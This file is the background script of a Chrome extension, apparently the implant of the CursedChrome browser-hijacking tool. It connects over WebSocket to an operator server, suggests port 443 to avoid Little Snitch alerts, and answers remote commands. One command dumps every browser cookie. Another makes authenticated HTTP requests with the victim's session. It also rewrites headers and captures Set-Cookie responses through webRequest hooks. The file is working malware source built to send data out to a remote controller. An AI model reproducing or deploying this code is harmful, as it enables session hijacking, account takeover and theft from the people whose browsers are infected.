// Update this URI to point at your CursedChrome server.
// For SSL/TLS use wss:// and ideally port 443 (avoids Little Snitch alerts).
const WEBSOCKET_URI = "ws://127.0.0.1:4343";
const PING_INTERVAL_MS = 3000;
const CONNECTION_TIMEOUT_S = 29;

const REQUEST_HEADER_BLOCKLIST = ['cookie'];

// Headers fetch() cannot set correctly — replaced on the wire via webRequest.
const HEADERS_TO_REPLACE = [
    'origin', 'referer', 'access-control-request-headers',
    'access-control-request-method', 'access-control-allow-origin',
    'date', 'dnt', 'trailer', 'upgrade',
];

const REDIRECT_STATUS_CODES = [301, 302, 307];

let websocket = null;
let last_live_connection_timestamp = get_unix_timestamp();
let placeholder_secret_token = get_secure_random_token(64);
const redirect_table = {};

const RPC_CALL_TABLE = {
    'HTTP_REQUEST': perform_http_request,
    'PONG': () => {},
    'AUTH': authenticate,
    'GET_COOKIES': get_cookies,
};

function get_unix_timestamp() {
    return Math.floor(Date.now() / 1000);
}

function get_secure_random_token(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const array = new Uint8Array(length);
    crypto.getRandomValues(array);
    return Array.from(array, x => chars[x % chars.length]).join('');
}

function arrayBufferToBase64(buffer) {
    let binary = '';
    for (const byte of new Uint8Array(buffer)) binary += String.fromCharCode(byte);
    return btoa(binary);
}

async function get_cookies() {
    return chrome.cookies ? chrome.cookies.getAll({}) : [];
}

async function authenticate() {
    const { browser_id: stored_id } = await chrome.storage.local.get('browser_id');
    const browser_id = stored_id ?? crypto.randomUUID();
    if (!stored_id) await chrome.storage.local.set({ browser_id });
    return {
        browser_id,
        user_agent: navigator.userAgent,
        timestamp: get_unix_timestamp(),
    };
}

async function perform_http_request(params) {
    const credentials_mode = params.authenticated ? 'include' : 'omit';
    params.headers['X-PLACEHOLDER-SECRET'] = placeholder_secret_token;

    const headers_to_replace = Object.keys(params.headers).filter(
        k => HEADERS_TO_REPLACE.includes(k.toLowerCase())
    );
    for (const key of headers_to_replace) {
        params.headers[`X-PLACEHOLDER-${key}`] = params.headers[key];
        delete params.headers[key];
    }

    const request_options = {
        method: params.method,
        mode: 'cors',
        cache: 'no-cache',
        credentials: credentials_mode,
        headers: params.headers,
        redirect: 'follow',
    };

    if (params.body) {
        const blob_response = await fetch(`data:application/octet-stream;base64,${params.body}`);
        request_options.body = await blob_response.blob();
    }

    let response;
    try {
        response = await fetch(params.url, request_options);
    } catch (e) {
        console.error('fetch() failed:', e);
        return;
    }

    const response_headers = {};
    for (const [name, value] of response.headers.entries()) {
        if (name === 'x-set-cookie') {
            response_headers['Set-Cookie'] = JSON.parse(value);
        } else {
            response_headers[name] = value;
        }
    }

    const redirect_prefix = `${location.origin}/redirect-hack.html?id=`;
    if (response.url.startsWith(redirect_prefix)) {
        const hack_id = decodeURIComponent(response.url).replace(redirect_prefix, '');
        const meta = redirect_table[hack_id];
        delete redirect_table[hack_id];

        const headers = {};
        for (const { name, value } of meta.headers) {
            if (name.toLowerCase() === 'set-cookie') continue;
            if (name === 'X-Set-Cookie') {
                headers['Set-Cookie'] = JSON.parse(value);
            } else {
                headers[name] = value;
            }
        }

        return { url: response.url, status: meta.status_code, status_text: 'Redirect', headers, body: '' };
    }

    return {
        url: response.url,
        status: response.status,
        status_text: response.statusText,
        headers: response_headers,
        body: arrayBufferToBase64(await response.arrayBuffer()),
    };
}

function send(payload) {
    websocket.send(JSON.stringify(payload));
}

function initialize() {
    websocket = new WebSocket(WEBSOCKET_URI);

    websocket.onmessage = async function (event) {
        last_live_connection_timestamp = get_unix_timestamp();

        let parsed;
        try {
            parsed = JSON.parse(event.data);
        } catch {
            console.error('Failed to parse WebSocket message');
            return;
        }

        const handler = RPC_CALL_TABLE[parsed.action];
        if (!handler) {
            console.error(`Unknown RPC action: ${parsed.action}`);
            return;
        }

        const result = await handler(parsed.data);
        send({ id: parsed.id, origin_action: parsed.action, result });
    };

    websocket.onclose = function (event) {
        console.log(event.wasClean
            ? `[close] Clean close: code=${event.code} reason=${event.reason}`
            : '[close] Connection died');
    };

    websocket.onerror = function (error) {
        console.error(`[error] ${error.message}`);
    };
}

setInterval(() => {
    if (!websocket) return;

    if ([WebSocket.CONNECTING, WebSocket.CLOSING].includes(websocket.readyState)) return;

    const elapsed = get_unix_timestamp() - last_live_connection_timestamp;
    if (elapsed > CONNECTION_TIMEOUT_S || websocket.readyState === WebSocket.CLOSED) {
        console.error('WebSocket connection lost, reconnecting...');
        try { websocket.close(); } catch {}
        initialize();
        return;
    }

    send({ id: crypto.randomUUID(), version: '1.0.0', action: 'PING', data: {} });
}, PING_INTERVAL_MS);

/*
 * Some headers cannot be set by fetch() (e.g. Origin is overwritten with the extension ID).
 * We work around this by setting X-PLACEHOLDER-<Header> in the fetch call and swapping it
 * for the real header here. X-PLACEHOLDER-SECRET prevents malicious pages from exploiting
 * this mechanism by injecting X-PLACEHOLDER-* headers into their own requests.
 */
chrome.webRequest.onBeforeSendHeaders.addListener(
    function (details) {
        if (details.initiator !== location.origin) return;

        const secret = details.requestHeaders.find(
            h => h.name === 'X-PLACEHOLDER-SECRET' && h.value === placeholder_secret_token
        );
        if (!secret) return { cancel: false };

        const to_delete = new Set(['X-PLACEHOLDER-SECRET']);
        const to_append = [];

        for (const header of details.requestHeaders) {
            if (!header.name.startsWith('X-PLACEHOLDER-') || header.name === 'X-PLACEHOLDER-SECRET') continue;
            to_delete.add(header.name);
            const real_name = header.name.replace('X-PLACEHOLDER-', '');
            if (!REQUEST_HEADER_BLOCKLIST.includes(real_name.toLowerCase())) {
                to_append.push({ name: real_name, value: header.value });
            }
        }

        details.requestHeaders = details.requestHeaders
            .filter(h => !to_delete.has(h.name))
            .concat(to_append);

        return { requestHeaders: details.requestHeaders };
    },
    { urls: ['<all_urls>'] },
    ['requestHeaders', 'extraHeaders']
);

chrome.webRequest.onHeadersReceived.addListener(
    function (details) {
        if (details.initiator !== location.origin) return;

        // Pack all Set-Cookie headers into one X-Set-Cookie header so fetch() can read them.
        const cookies = details.responseHeaders
            .filter(h => h.name.toLowerCase() === 'set-cookie')
            .map(h => h.value);

        if (cookies.length > 0) {
            details.responseHeaders.push({ name: 'X-Set-Cookie', value: JSON.stringify(cookies) });
        }

        if (!REDIRECT_STATUS_CODES.includes(details.statusCode)) {
            return { responseHeaders: details.responseHeaders };
        }

        // Redirect responses: fetch() follows them transparently, losing the original status and
        // headers. Intercept by redirecting to a local page keyed by a UUID, then look it up
        // in perform_http_request() to return the real metadata.
        const hack_id = crypto.randomUUID();
        redirect_table[hack_id] = {
            url: details.url,
            status_code: details.statusCode,
            headers: details.responseHeaders,
        };

        return { redirectUrl: `${location.origin}/redirect-hack.html?id=${hack_id}` };
    },
    { urls: ['<all_urls>'] },
    ['responseHeaders', 'extraHeaders']
);

initialize();
